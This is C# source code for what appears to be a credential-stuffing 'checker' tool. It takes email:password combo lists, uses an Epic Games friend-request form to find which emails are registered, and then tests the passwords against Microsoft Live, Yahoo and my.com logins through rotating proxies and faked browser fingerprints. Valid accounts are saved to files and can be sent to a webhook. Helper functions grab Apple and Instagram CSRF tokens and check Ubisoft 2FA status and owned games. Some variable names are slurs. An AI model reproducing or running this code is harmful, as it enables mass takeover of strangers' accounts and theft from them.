using System; using Galaxy.Mainm;
using System.Collections.Generic;
using System.Diagnostics;
using System.Drawing;
using System.IO;
using System.Linq;
using System.Net;
using System.Text;
using System.Text.RegularExpressions;
using System.Threading;
using System.Web;
using AuthGG;
using Leaf.xNet;
using Newtonsoft.Json;
using Newtonsoft.Json.Linq;
using ZuttPal;
using Console = Colorful.Console;
namespace ZuttPal
{
	internal class fortnite1kek
	{
		public static string Path;
		private static ReaderWriterLockSlim locker = new ReaderWriterLockSlim();
		public static void startchecker1()
		{
			for (; ; )
			{
				while (!fortnite1check.Combo.IsEmpty)
				{
					using (Leaf.xNet.HttpRequest httpRequest = new Leaf.xNet.HttpRequest())
					{
						if (fortnite1check.Combo.TryDequeue(out string acc))
						{
							try
							{
								var array = acc.Split(new char[3] { ':', ';', '|' });
								var email = array[0];
								var password = array[1];
								string account = email + ":" + password;
								if (Program.config.proxytype.ToUpper() == "PROXYLESS") { string hora = "MK"; } else httpRequest.Proxy = fortnite1check.RandomProxies();
								httpRequest.AddHeader("User-Agent", "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/80.0.3987.149 Safari/537.36");
								httpRequest.AddHeader("Pragma", "no-cache");
								httpRequest.AddHeader("Accept", "*/*");
								string pre_req = httpRequest.Get("https://www.paypal.com/mu/welcome/signup/").ToString();
								var U_A = Http.RandomUserAgent();
								var Epic_Device = Guid.NewGuid().ToString();
								var EPIC_FUNNEL_ID = Functions.Resolve("?h?h?h?h?h?h?h?h?h?h?h?h?h?h?h?h?h?h?h?h?h?h?h?h?h?h?h?h?h?h?h?h");
								httpRequest.AddHeader("User-Agent", "Mozilla/5.0 (Windows NT 10.0; WOW64; Trident/7.0; rv:11.0) like Gecko");
								httpRequest.AddHeader("Pragma", "no-cache");
								httpRequest.AddHeader("Accept", "*/*");
								var res7 = httpRequest.Get("https://www.epicgames.com/id/api/csrf");
								string text7 = res7.ToString();
								var XSRF_TOKEN = httpRequest.Cookies.GetCookies("https://www.epicgames.com/id/api/csrf")["XSRF-TOKEN"].Value;

								httpRequest.ClearAllHeaders();
								httpRequest.AllowAutoRedirect = false;

								httpRequest.AddHeader("EPIC_DEVICE", Epic_Device);
								httpRequest.AddHeader("EPIC_FUNNEL_ID", EPIC_FUNNEL_ID);
								httpRequest.AddHeader("XSRF-TOKEN", XSRF_TOKEN);
								httpRequest.AddHeader("User-Agent", U_A);
								httpRequest.AddHeader("Pragma", "no-cache");
								httpRequest.AddHeader("Accept", "*/*");
								httpRequest.AddHeader("Host", "accounts.launcher-website-prod07.ol.epicgames.com");
								httpRequest.AddHeader("Accept-Language", "nb-NO,nb;q=0.9,no-NO;q=0.8,no;q=0.6,nn-NO;q=0.5,nn;q=0.4,en-US;q=0.3,en;q=0.1");
								httpRequest.AddHeader("Accept-Encoding", "gzip, deflate, br");
								httpRequest.AddHeader("X-XSRF-TOKEN", XSRF_TOKEN);
								httpRequest.AddHeader("Origin", "https://accounts.launcher-website-prod07.ol.epicgames.com");
								httpRequest.AddHeader("DNT", "1");
								httpRequest.AddHeader("Connection", "keep-alive");
								httpRequest.AddHeader("Referer", "https://accounts.launcher-website-prod07.ol.epicgames.com/launcher/addFriends");
								var res0 = httpRequest.Post("https://accounts.launcher-website-prod07.ol.epicgames.com/launcher/sendFriendRequest", "inputEmail=" + email + "&tab=connections", "application/x-www-form-urlencoded");
								string text0 = res0.ToString();

								if (text0.Contains("class=\"fieldValidationError\"><label for=\"inputEmail\" class=\"fieldValidationError\">Sorry, it appears that you have tried to submit the form twice. Please click only once.</label></div>") || text0.Contains("class=\"fieldValidationError\"><label for=\"inputEmail\" class=\"fieldValidationError\">Sorry, you are visiting our service too frequent, please try again later.</label></div>"))
								{
									string acc1 = email + ":" + password;
									epicgamesvmcheck.Combo.Enqueue(acc1);
									Interlocked.Increment(ref epicgamesvmcheck.retry);
								}
								else if (text0.Contains("class=\"fieldValidationError\"><label for=\"inputEmail\" class=\"fieldValidationError\">Please Sign In</label></div>"))
								{
									HOTMAILRETRY:
										httpRequest.AddHeader("accept", "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9");
										httpRequest.AddHeader("accept-encoding", "null");
										httpRequest.AddHeader("accept-language", "en-US,en;q=0.9");
										httpRequest.AddHeader("cache-control", "max-age=0");
										httpRequest.AddHeader("content-length", "577");
										httpRequest.AddHeader("content-type", "application/x-www-form-urlencoded");
										httpRequest.AddHeader("cookie", "mkt=en-US; IgnoreCAW=1; MSCC=78.154.246.156-KW; MSPPre=c30e7cc3fc@firemailbox.club|209e2c9ba7f028c9||; MSPCID=209e2c9ba7f028c9; NAP=V=1.9&E=185a&C=YwJQ3-nJ3Oxms7ZqjKRPmeqfVlRl1_r70wln_ZOIIG3EyoRB16iTiA&W=2; ANON=A=45999FA1DB485D6EB926DA6BFFFFFFFF&E=18b4&W=2; SDIDC=CVuLKa5AIHJ5uwsBaOQt8nGLrmHZTYIsLuioHo6G0FNowfAcDMZkbAps9l0rcBGO540QWpXVPvUAcIQ1L7tlq06*97mj8ZAenWxDZuZRVsBTRVzzTnBfzvmhgDEo4xDK0aUQqANO3lggDjmIQkuueQtAlU*DfXR6rjEXlFsapFcCrsaYZoCXLgY*ou8MgnpDHUtA6Slww6NNLWwU!TdvMvo$; uaid=e94a49f177664960a3fca122edaf8a27; MSPOK=$uuid-5b220485-c233-4727-af20-52793217a373$uuid-029049e1-c2db-4c4e-83f1-7b736e9b8c34; wlidperf=FR=L&ST=1603778552344");
										httpRequest.AddHeader("origin", "https://login.live.com");
										httpRequest.AddHeader("referer", "https://login.live.com/ppsecure/post.srf?wa=wsignin1.0&rpsnv=13&rver=7.1.6819.0&wp=MBI_SSL&wreply=https:%2f%2faccount.xbox.com%2fen-us%2faccountcreation%3freturnUrl%3dhttps:%252f%252fwww.xbox.com:443%252fen-US%252f%26ru%3dhttps:%252f%252fwww.xbox.com%252fen-US%252f%26rtc%3d1&lc=1033&id=292543&aadredir=1&contextid=C61E086B741A7BC9&bk=1573475927&uaid=e94a49f177664960a3fca122edaf8a27&pid=0");
										httpRequest.AddHeader("sec-fetch-dest", "document");
										httpRequest.AddHeader("sec-fetch-mode", "navigate");
										httpRequest.AddHeader("sec-fetch-site", "same-origin");
										httpRequest.AddHeader("sec-fetch-user", "?1");
										httpRequest.AddHeader("upgrade-insecure-requests", "1");
										httpRequest.AddHeader("user-agent", "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/86.0.4240.111 Safari/537.36");
										var fetahora = httpRequest.Post("https://login.live.com/ppsecure/post.srf?wa=wsignin1.0&rpsnv=13&rver=7.1.6819.0&wp=MBI_SSL&wreply=https:%2f%2faccount.xbox.com%2fen-us%2faccountcreation%3freturnUrl%3dhttps:%252f%252fwww.xbox.com:443%252fen-US%252f%26ru%3dhttps:%252f%252fwww.xbox.com%252fen-US%252f%26rtc%3d1&lc=1033&id=292543&aadredir=1&contextid=C61E086B741A7BC9&bk=1603778533&uaid=e94a49f177664960a3fca122edaf8a27&pid=0", "i13=0&login=" + email + "&loginfmt=" + email + "&type=11&LoginOptions=3&lrt=&lrtPartition=&hisRegion=&hisScaleUnit=&passwd=" + password + "&ps=2&psRNGCDefaultType=&psRNGCEntropy=&psRNGCSLK=&canary=&ctx=&hpgrequestid=&PPFT=DUFc1dzD7yfbc6p1hw0Cd65jSD5xqvLeZIGaSdFAY0DtnynhExxOcwym3FibChimglSUc8j4bxbFM8qQ0vCPRsAEM2U623Kd9OztNH%21NBFY20tDsPhoUIuEUzMmTHEKXUWGC5qFYjOglF6yw*T14eF4b9JjU0%21JvLg41z6jonbYfBwY7F8rot5MTOPKnxlyiM3rf0jyeGb4tqHwmwhKPYzA%24&PPSX=PassportR&NewUser=1&FoundMSAs=&fspost=0&i21=0&CookieDisclosure=0&IsFidoSupported=1&isSignupPost=0&i2=1&i17=0&i18=&i19=18405", "application/x-www-form-urlencoded");
										string neger = fetahora.ToString();
										if (neger.Contains("name=\"ANON\"") || neger.Contains("https://account.live.com/profile/accrue?mkt=") || neger.Contains($"sSigninName:'{email}',bG:'https://login.live.com/gls.srf") || neger.Contains("name=\\\"t\\\" id=\\\"t\\\"") || neger.Contains("type=\"hidden\" name=\"t\" id=\"t\" value=\""))
										{
											lock (Program.WriteLock)
											{
												Interlocked.Increment(ref fortnite1check.CheckedLines); Interlocked.Increment(ref stats.checcc);
												Interlocked.Increment(ref fortnite1check.currentCpm); Interlocked.Increment(ref stats.currentCpm);
												Interlocked.Increment(ref fortnite1check.Hits); Interlocked.Increment(ref stats.hits);
												string cap = $"{account}";
												if (Program.config.showgood == "True" && Program.config.ui == 2)
												{
													Colorful.Console.WriteLine("[»] Valid " + account, Color.Green);
												}
												if (Program.config.hitstowebhook == "True") { string data1 = "{\"username\": \"Hit Sender\",\"embeds\":[    {\"description\":\"[+] Hit: " + account + "\", \"title\":\"" + Checking.currentrun + "\", \"color\":1018364}]  }"; string hitsend = httpRequest.Post(Program.config.webhook, data1, "application/json").ToString(); }
												Save(Path + "\\Valid.txt", account);
											}
											break;
										}
										else if (neger.Contains("incorrect account or password.\",") || neger.Contains("timed out"))
										{
									YAHOORETRY:
										httpRequest.AddHeader("Accept", "*/*");
										httpRequest.AddHeader("User-Agent", "Mozilla/5.0 (Windows NT 10.0; WOW64; Trident/7.0; rv:11.0) like Gecko");
										httpRequest.AddHeader("Pragma", "no-cache");
										string input = httpRequest.Get("https://login.yahoo.com/").ToString();
										string text = Functions.LR(input, "name=\"crumb\" value=\"", "\"").FirstOrDefault();
										string text2 = Functions.LR(input, "name=\"acrumb\" value=\"", "\"").FirstOrDefault();
										string text3 = Functions.LR(input, "name=\"sessionIndex\" value=\"", "\"").FirstOrDefault();
										httpRequest.AddHeader("Host", "login.yahoo.com");
										httpRequest.AddHeader("Connection", "keep-alive");
										httpRequest.AddHeader("User-Agent", "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/88.0.4324.104 Safari/537.36");
										httpRequest.AddHeader("X-Requested-With", "XMLHttpRequest");
										httpRequest.AddHeader("Origin", "https://login.yahoo.com");
										httpRequest.AddHeader("Sec-Fetch-Site", "same-origin");
										httpRequest.AddHeader("Sec-Fetch-Mode", "cors");
										httpRequest.AddHeader("Sec-Fetch-Dest", "empty");
										httpRequest.AddHeader("Referer", "https://login.yahoo.com/");
										httpRequest.AddHeader("Accept-Encoding", "gzip, deflate, br");
										httpRequest.AddHeader("Accept-Language", "en-US,en;q=0.9");
										string text4 = httpRequest.Post("https://login.yahoo.com/", "browser-fp-data=%7B%22language%22%3A%22en-US%22%2C%22colorDepth%22%3A24%2C%22deviceMemory%22%3A8%2C%22pixelRatio%22%3A1%2C%22hardwareConcurrency%22%3A4%2C%22timezoneOffset%22%3A-120%2C%22timezone%22%3A%22Africa%2FCairo%22%2C%22sessionStorage%22%3A1%2C%22localStorage%22%3A1%2C%22indexedDb%22%3A1%2C%22openDatabase%22%3A1%2C%22cpuClass%22%3A%22unknown%22%2C%22platform%22%3A%22Win32%22%2C%22doNotTrack%22%3A%22unknown%22%2C%22plugins%22%3A%7B%22count%22%3A3%2C%22hash%22%3A%22e43a8bc708fc490225cde0663b28278c%22%7D%2C%22canvas%22%3A%22canvas%20winding%3Ayes~canvas%22%2C%22webgl%22%3A1%2C%22webglVendorAndRenderer%22%3A%22Google%20Inc.~ANGLE%20(NVIDIA%20GeForce%20GT%20710%20Direct3D11%20vs_5_0%20ps_5_0)%22%2C%22adBlock%22%3A0%2C%22hasLiedLanguages%22%3A0%2C%22hasLiedResolution%22%3A0%2C%22hasLiedOs%22%3A0%2C%22hasLiedBrowser%22%3A0%2C%22touchSupport%22%3A%7B%22points%22%3A0%2C%22event%22%3A0%2C%22start%22%3A0%7D%2C%22fonts%22%3A%7B%22count%22%3A33%2C%22hash%22%3A%22edeefd360161b4bf944ac045e41d0b21%22%7D%2C%22audio%22%3A%22124.04347527516074%22%2C%22resolution%22%3A%7B%22w%22%3A%221280%22%2C%22h%22%3A%221024%22%7D%2C%22availableResolution%22%3A%7B%22w%22%3A%22984%22%2C%22h%22%3A%221280%22%7D%2C%22ts%22%3A%7B%22serve%22%3A1611840196072%2C%22render%22%3A1611840197054%7D%7D&crumb=" + text + "&acrumb=" + text2 + "&sessionIndex=" + text3 + "&displayName=&deviceCapability=%7B%22pa%22%3A%7B%22status%22%3Afalse%7D%7D&username=" + email + "&passwd=&signin=Next&persistent=y", "application/x-www-form-urlencoded").ToString();
										if (text4.Contains("location\":\"/account/challenge/password"))
										{
											string str = Functions.LR(text4, "\"location\":\"", "\"}").FirstOrDefault();
											httpRequest.AllowAutoRedirect = false;
											httpRequest.AddHeader("Host", "login.yahoo.com");
											httpRequest.AddHeader("Connection", "keep-alive");
											httpRequest.AddHeader("User-Agent", "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/88.0.4324.104 Safari/537.36");
											httpRequest.AddHeader("X-Requested-With", "XMLHttpRequest");
											httpRequest.AddHeader("Origin", "https://login.yahoo.com");
											httpRequest.AddHeader("Sec-Fetch-Site", "same-origin");
											httpRequest.AddHeader("Sec-Fetch-Mode", "cors");
											httpRequest.AddHeader("Sec-Fetch-Dest", "empty");
											httpRequest.AddHeader("Referer", "https://login.yahoo.com/");
											httpRequest.AddHeader("Accept-Encoding", "gzip, deflate, br");
											httpRequest.AddHeader("Accept-Language", "en-US,en;q=0.9");
											string text5 = httpRequest.Post("https://login.yahoo.com" + str, "browser-fp-data=%7B%22language%22%3A%22en%22%2C%22colorDepth%22%3A32%2C%22deviceMemory%22%3A%22unknown%22%2C%22pixelRatio%22%3A2%2C%22hardwareConcurrency%22%3A%22unknown%22%2C%22timezoneOffset%22%3A-60%2C%22timezone%22%3A%22Africa%2FCasablanca%22%2C%22sessionStorage%22%3A1%2C%22localStorage%22%3A1%2C%22indexedDb%22%3A1%2C%22cpuClass%22%3A%22unknown%22%2C%22platform%22%3A%22iPhone%22%2C%22doNotTrack%22%3A%22unknown%22%2C%22plugins%22%3A%7B%22count%22%3A0%2C%22hash%22%3A%2224700f9f1986800ab4fcc880530dd0ed%22%7D%2C%22canvas%22%3A%22canvas+winding%3Ayes%7Ecanvas%22%2C%22webgl%22%3A1%2C%22webglVendorAndRenderer%22%3A%22Apple+Inc.%7EApple+GPU%22%2C%22adBlock%22%3A0%2C%22hasLiedLanguages%22%3A0%2C%22hasLiedResolution%22%3A0%2C%22hasLiedOs%22%3A1%2C%22hasLiedBrowser%22%3A0%2C%22touchSupport%22%3A%7B%22points%22%3A5%2C%22event%22%3A1%2C%22start%22%3A1%7D%2C%22fonts%22%3A%7B%22count%22%3A13%2C%22hash%22%3A%22ef5cebb772562bd1af018f7f69d53c9e%22%7D%2C%22audio%22%3A%2235.10892717540264%22%2C%22resolution%22%3A%7B%22w%22%3A%22414%22%2C%22h%22%3A%22896%22%7D%2C%22availableResolution%22%3A%7B%22w%22%3A%22896%22%2C%22h%22%3A%22414%22%7D%2C%22ts%22%3A%7B%22serve%22%3A1604943657070%2C%22render%22%3A1604943657274%7D%7D&crumb=" + text + "&acrumb=" + text2 + "&sessionIndex=" + text3 + "&displayName=" + email + "&passwordContext=normal&password=" + password + "&verifyPassword=Next", "application/x-www-form-urlencoded").ToString();
											if (text5.Contains("https://guce.yahoo.com/consent") || text5.Contains("https://login.yahoo.com/account/comm-channel") || text5.Contains("https://login.yahoo.com/account/fb-messenger"))
											{
												lock (Program.WriteLock)
												{
													Interlocked.Increment(ref fortnite1check.CheckedLines); Interlocked.Increment(ref stats.checcc);
													Interlocked.Increment(ref fortnite1check.currentCpm); Interlocked.Increment(ref stats.currentCpm);
													Interlocked.Increment(ref fortnite1check.Hits); Interlocked.Increment(ref stats.hits);
													if (Program.config.showgood == "True" && Program.config.ui == 2)
													{
														Colorful.Console.WriteLine("[»] Valid " + account, Color.Green);
													}
													if (Program.config.hitstowebhook == "True") { string data1 = "{\"username\": \"Hit Sender\",\"embeds\":[    {\"description\":\"[+] Hit: " + account + "\", \"title\":\"" + Checking.currentrun + "\", \"color\":1018364}]  }"; string hitsend = httpRequest.Post(Program.config.webhook, data1, "application/json").ToString(); }
													Save(Path + "\\Valid.txt", account);
												}
												break;
											}
											else if (text5.Contains("/account/challenge/password"))
											{
												MAINRETRY:
												string horan = httpRequest.Get("https://aj-https.my.com/cgi-bin/auth?timezone=GMT%2B2&reqmode=fg&ajax_call=1&udid=16cbef29939532331560e4eafea6b95790a743e9&device_type=Tablet&mp=iOS¤t=MyCom&mmp=mail&os=iOS&md5_signature=6ae1accb78a8b268728443cba650708e&os_version=9.2&model=iPad%202%3B%28WiFi%29&simple=1&Login=" + array[0] + "&ver=4.2.0.12436&DeviceID=D3E34155-21B4-49C6-ABCD-FD48BB02560D&country=GB&language=fr_FR&LoginType=Direct&Lang=en_FR&Password=" + array[1] + "&device_vendor=Apple&mob_json=1&DeviceInfo=%7B%22Timezone%22%3A%22GMT%2B2%22%2C%22OS%22%3A%22iOS%209.2%22%2C?%22AppVersion%22%3A%224.2.0.12436%22%2C%22DeviceName%22%3A%22iPad%22%2C%22Device?%22%3A%22Apple%20iPad%202%3B%28WiFi%29%22%7D&device_name=iPad&").ToString();
												if (horan.Contains("Ok=1") || horan.Contains("Ok= 1"))
												{
													lock (Program.WriteLock)
													{
														Interlocked.Increment(ref fortnite1check.CheckedLines); Interlocked.Increment(ref stats.checcc);
														Interlocked.Increment(ref fortnite1check.currentCpm); Interlocked.Increment(ref stats.currentCpm);
														Interlocked.Increment(ref fortnite1check.Hits); Interlocked.Increment(ref stats.hits);
														if (Program.config.showgood == "True" && Program.config.ui == 2)
														{
															Colorful.Console.WriteLine("[»] Valid " + account, Color.Green);
														}
														if (Program.config.hitstowebhook == "True") { string data1 = "{\"username\": \"Hit Sender\",\"embeds\":[    {\"description\":\"[+] Hit: " + account + "\", \"title\":\"" + Checking.currentrun + "\", \"color\":1018364}]  }"; string hitsend = httpRequest.Post(Program.config.webhook, data1, "application/json").ToString(); }
														Save(Path + "\\Valid.txt", account);
													}
													break;
												}
												else if (horan.Contains("Ok=0"))
												{
													lock (Program.WriteLock)
													{
														Interlocked.Increment(ref fortnite1check.CheckedLines); Interlocked.Increment(ref stats.checcc);
														Interlocked.Increment(ref fortnite1check.currentCpm); Interlocked.Increment(ref stats.currentCpm);
														Interlocked.Increment(ref fortnite1check.Bad); Interlocked.Increment(ref stats.bad);
														if (Program.config.showbad == "True" && Program.config.ui == 2)
														{
															Colorful.Console.WriteLine("[»] Invalid " + account, Color.Red);
														}
														Save(Path + "\\Invalid.txt", account);
													}
													break;
												}
												else
												{
													goto MAINRETRY;
												}
											}
											else if (text5.Contains("/account/challenge/challenge-selector?"))
											{
												lock (Program.WriteLock)
												{
													Interlocked.Increment(ref fortnite1check.CheckedLines); Interlocked.Increment(ref stats.checcc);
													Interlocked.Increment(ref fortnite1check.currentCpm); Interlocked.Increment(ref stats.currentCpm);
													Interlocked.Increment(ref fortnite1check.custom);
													if (Program.config.showlocked == "True" && Program.config.ui == 2)
													{
														Colorful.Console.WriteLine("[»] Custom " + account, Color.LightPink);
													}
													Save(Path + "\\Customs.txt", account);
												}
												break;

											}
											else
											{
												goto YAHOORETRY;
											}

										}
										else if (neger.Contains("account.live.com/recover?mkt") || neger.Contains("recover?mkt") || neger.Contains("account.live.com/identity/confirm?mkt") || neger.Contains("Email/Confirm?mkt") || neger.Contains("/cancel?mkt=") || neger.Contains("/Abuse?mkt=") || neger.Contains("JavaScript required to sign in"))
										{
											lock (Program.WriteLock)
											{
												Interlocked.Increment(ref fortnite1check.CheckedLines); Interlocked.Increment(ref stats.checcc);
												Interlocked.Increment(ref fortnite1check.currentCpm); Interlocked.Increment(ref stats.currentCpm);
												Interlocked.Increment(ref fortnite1check.custom);
												if (Program.config.showlocked == "True" && Program.config.ui == 2)
												{
													Colorful.Console.WriteLine("[»] Custom " + account, Color.LightPink);
												}
												if (Program.config.hitstowebhook == "True") { string data1 = "{\"username\": \"Hit Sender\",\"embeds\":[    {\"description\":\"[+] Hit: " + account + "\", \"title\":\"" + Checking.currentrun + "\", \"color\":1018364}]  }"; string hitsend = httpRequest.Post(Program.config.webhook, data1, "application/json").ToString(); }
												Save(Path + "\\Custom.txt", account);
											}
											break;
										}

										else
										{
											goto HOTMAILRETRY;
										}
									}
								}
								else if (text0.Contains("class=\"fieldValidationError\"><label for=\"inputEmail\" class=\"fieldValidationError\">Sorry, this account was not found</label></div>"))
								{

									lock (Program.WriteLock)
									{
										Interlocked.Increment(ref fortnite1check.CheckedLines); Interlocked.Increment(ref stats.checcc);
										Interlocked.Increment(ref fortnite1check.currentCpm); Interlocked.Increment(ref stats.currentCpm);
										Interlocked.Increment(ref fortnite1check.Bad); Interlocked.Increment(ref stats.bad);
										if (Program.config.showbad == "True" && Program.config.ui == 2)
										{
											Colorful.Console.WriteLine("[»] Invalid " + account, Color.Red);
										}
										Save(Path + "\\Invalid.txt", account);
									}
									break;
								}
								else
								{
									string acc1 = email + ":" + password;
									fortnite1check.Combo.Enqueue(acc1);
									Interlocked.Increment(ref fortnite1check.retry);
									break;
								}
							}
							catch (Exception)
							{
								var array = acc.Split(new char[3] { ':', ';', '|' });
								var email = array[0];
								var password = array[1];
								var account = email + password;
								string acc1 = email + ":" + password;
								fortnite1check.Combo.Enqueue(acc1);
								Interlocked.Increment(ref fortnite1check.retry);
								break;
							}
						}
					}
				}
			}
		}
		private readonly Random _random = new Random();
		private static string RandomString(int length)
		{
			const string pool = "ABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789";
			var builder = new StringBuilder();

			for (var i = 0; i < length; i++)
			{
				var c = pool[random.Next(0, pool.Length)];
				builder.Append(c);
			}

			return builder.ToString();
		}
		static string AppleGetToken(ref CookieStorage cookies)
		{
			while (true)
			{
				try
				{
					using (Leaf.xNet.HttpRequest httpRequest = new Leaf.xNet.HttpRequest())
					{
						if (Program.config.proxytype.ToUpper() == "PROXYLESS") { string hora = "MK";  } else httpRequest.Proxy = fortnite1check.RandomProxies();
						cookies = new CookieStorage();
						httpRequest.Cookies = cookies;
						httpRequest.UserAgent = "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/80.0.3987.149 Safari/537.36";
						httpRequest.AddHeader("Accept", "*/*");

						string strResponse = httpRequest.Get(new Uri("https://secure4.store.apple.com/shop/sign_in?c=aHR0cHM6Ly93d3cuYXBwbGUuY29tL3wxYW9zZTQyMmM4Y2NkMTc4NWJhN2U2ZDI2NWFmYWU3NWI4YTJhZGIyYzAwZQ&r=SCDHYHP7CY4H9XK2H&s=aHR0cHM6Ly93d3cuYXBwbGUuY29tL3wxYW9zZTQyMmM4Y2NkMTc4NWJhN2U2ZDI2NWFmYWU3NWI4YTJhZGIyYzAwZQ")).ToString();

						if (strResponse.Contains("stk\":\""))
						{
							return Regex.Match(strResponse, "stk\":\"(.*?)\"}").Groups[1].Value;
						}
					}
				}
				catch
				{
					Interlocked.Increment(ref fortnite1check.retry);
				}
			}
		}
			


						public int RandomNumber(int min, int max)
		{
			return _random.Next(min, max);
		}

		static Random random = new Random();
		public string RandomString(int size, bool lowerCase = false)
		{
			var builder = new StringBuilder(size);

			// char is a single Unicode character  
			char offset = lowerCase ? 'a' : 'A';
			const int lettersOffset = 26; // A...Z or a..z: length = 26  

			for (var i = 0; i < size; i++)
			{
				var @char = (char)_random.Next(offset, offset + lettersOffset);
				builder.Append(@char);
			}

			return lowerCase ? builder.ToString().ToLower() : builder.ToString();
		}
		public string RandomPassword()
		{
			var passwordBuilder = new StringBuilder();

			// 4-Digits between 1000 and 9999  
			passwordBuilder.Append(RandomNumber(1000, 9999));

			// 2-Letters upper case  
			passwordBuilder.Append(RandomString(2));
			return passwordBuilder.ToString();
		}
		public static string GetRandomHexNumber(int digits)
		{
			byte[] buffer = new byte[digits / 2];
			random.NextBytes(buffer);
			string result = String.Concat(buffer.Select(x => x.ToString("X2")).ToArray());
			if (digits % 2 == 0)
				return result;
			return result + random.Next(16).ToString("X");
		}
		private static string UPlayHas2FA(string ticket, string sessionId)
		{
			while (true)
			{
				try
				{
					using (Leaf.xNet.HttpRequest req = new Leaf.xNet.HttpRequest())
					{
						req.Proxy = fortnite1check.RandomProxies();
						req.AddHeader("Ubi-SessionId", sessionId);
						req.AddHeader("Ubi-AppId", "e06033f4-28a4-43fb-8313-6c2d882bc4a6");
						req.Authorization = "Ubi_v1 t=" + ticket;
						string str = req.Get(new Uri("https://public-ubiservices.ubi.com/v3/profiles/me/2fa")).ToString();
						if (str.Contains("active"))
						{
							if (str.Contains("true"))
								return "true";
							if (str.Contains("false"))
								return "false";
						}
					}
				}
				catch
				{
					Interlocked.Increment(ref fortnite1check.retry);
				}
			}
		}

		private static string UPlayGetGames(string ticket)
		{
			while (true)
			{
				try
				{
					using (Leaf.xNet.HttpRequest req = new Leaf.xNet.HttpRequest())
					{
						req.Proxy = fortnite1check.RandomProxies();
						req.AddHeader("Ubi-AppId", "e06033f4-28a4-43fb-8313-6c2d882bc4a6");
						req.Authorization = "Ubi_v1 t=" + ticket;
						string input = req.Get(new Uri("https://public-ubiservices.ubi.com/v1/profiles/me/club/aggregation/website/games/owned")).ToString();
						if (input.Contains("[") && input != "[]")
						{
							Match match1 = Regex.Match(input, "\"slug\":\"(.*?)\"");
							Match match2 = Regex.Match(input, "\"platform\":\"(.*?)\"");
							string str1 = "";
							string str2;
							while (true)
							{
								str2 = str1 + "[" + match1.Groups[1].Value + " - " + match2.Groups[1].Value + "]";
								match1 = match1.NextMatch();
								match2 = match2.NextMatch();
								if (!(match1.Groups[1].Value == ""))
									str1 = str2 + ", ";
								else
									break;
							}
							return str2;
						}
					}
				}
				catch
				{
				}
			}
		}

			private static string MailAccessCheck(string email, string password)
		{
			while (true)
			{
				try
				{
					using (Leaf.xNet.HttpRequest httpRequest = new Leaf.xNet.HttpRequest())
					{
						if (Program.config.proxytype.ToUpper() == "PROXYLESS") { string hora = "MK";  } else httpRequest.Proxy = fortnite1check.RandomProxies();
						httpRequest.UserAgent = "MyCom/12436 CFNetwork/758.2.8 Darwin/15.0.0";
						if (httpRequest.Get(new Uri("https://aj-https.my.com/cgi-bin/auth?timezone=GMT%2B2&reqmode=fg&ajax_call=1&udid=16cbef29939532331560e4eafea6b95790a743e9&device_type=Tablet&mp=iOS¤t=MyCom&mmp=mail&os=iOS&md5_signature=6ae1accb78a8b268728443cba650708e&os_version=9.2&model=iPad%202%3B%28WiFi%29&simple=1&Login=" + email + "&ver=4.2.0.12436&DeviceID=D3E34155-21B4-49C6-ABCD-FD48BB02560D&country=GB&language=fr_FR&LoginType=Direct&Lang=en_FR&Password=" + password + "&device_vendor=Apple&mob_json=1&DeviceInfo=%7B%22Timezone%22%3A%22GMT%2B2%22%2C%22OS%22%3A%22iOS%209.2%22%2C?%22AppVersion%22%3A%224.2.0.12436%22%2C%22DeviceName%22%3A%22iPad%22%2C%22Device?%22%3A%22Apple%20iPad%202%3B%28WiFi%29%22%7D&device_name=iPad&")).ToString().Contains("Ok=1"))
							return "Working";
						break;
					}
				}
				catch
				{
					string acc1 = email + ":" + password;
					fortnite1check.Combo.Enqueue(acc1);
					Interlocked.Increment(ref fortnite1check.retry);
				}
			}
			return "";
		}
		private static string InstagramGetCSRF(ref CookieStorage cookies)
		{
			while (true)
			{
				try
				{
					using (Leaf.xNet.HttpRequest httpRequest = new Leaf.xNet.HttpRequest())
					{
						if (Program.config.proxytype.ToUpper() == "PROXYLESS") { string hora = "MK";  } else httpRequest.Proxy = fortnite1check.RandomProxies();
						httpRequest.IgnoreProtocolErrors = true;
						httpRequest.AllowAutoRedirect = false;
						cookies = new CookieStorage();
						httpRequest.Cookies = cookies;
						httpRequest.UserAgent = "Instagram 25.0.0.26.136 Android (24/7.0; 480dpi; 1080x1920; samsung; SM-J730F; j7y17lte; samsungexynos7870)";
						httpRequest.Get(new Uri("https://i.instagram.com/api/v1/accounts/login/")).ToString();
						return cookies.GetCookies("https://i.instagram.com")["csrftoken"].Value;
					}
				}
				catch
				{
					Interlocked.Increment(ref fortnite1check.retry);
				}
			}
		}

		public static string yey(string source, string left, string right)
		{
			return source.Split(new string[]
			{
				left
			}, StringSplitOptions.None)[1].Split(new string[]
			{
				right
			}, StringSplitOptions.None)[0];
		}
		public static void Save(string path, string line)
			{
			for (; ; )
			{
				try
				{
					File.AppendAllLines(path ?? "", new List<string>
					{
						line
					}, Encoding.UTF8);
					break;
				}
				catch
				{
				}
			}
		}
		public static string Base64Encode(string plainText) => Convert.ToBase64String(Encoding.UTF8.GetBytes(plainText));
		public static string uri = "";

		public static string auther = "";

		public static string showbad = "";

		public static string showlocked = "";

		public static List<string> Tokens = new List<string>();

		public static List<string> Urls = new List<string>();

		public static List<string> Auther = new List<string>();

		public static List<ProxyClient> ProxyList = new List<ProxyClient>();
	}
}
